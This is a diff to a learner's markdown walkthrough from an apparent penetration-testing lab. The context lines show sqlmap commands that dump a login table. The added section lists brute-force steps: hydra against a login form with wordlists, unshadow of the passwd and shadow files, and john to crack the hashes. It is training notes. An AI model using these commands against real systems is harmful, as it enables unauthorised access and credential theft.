@@ -45,7 +45,11 @@ Hey Hai, This is just a walkthrough and kinda recap of what in learnt during my 
 - sqlmap -u http://10.124.211.96/newsdetails.php?id=1 -D admin -T login -C username,password,logintime
 - Intercept the request using burp, save it to req.txt
 - sqlmap -r req.txt -p title  -> focusing cookie based sessions and multi-parameter based queries
-
+#### Brute Force
+- hydra crackme.site http-post-form "/login.php:usr=^USER^&pwd=^PASS^:invalid Credentials" -L  /usr/share/username.lst -P /usr/share/pass.lst -f -V
+- unshadow passwd shadow > hashestocrack
+- john hashestocrack     ->password      (username)
+- 
 ### The Black Box Walkthrough's : Box 1
 
 #### Machine 1
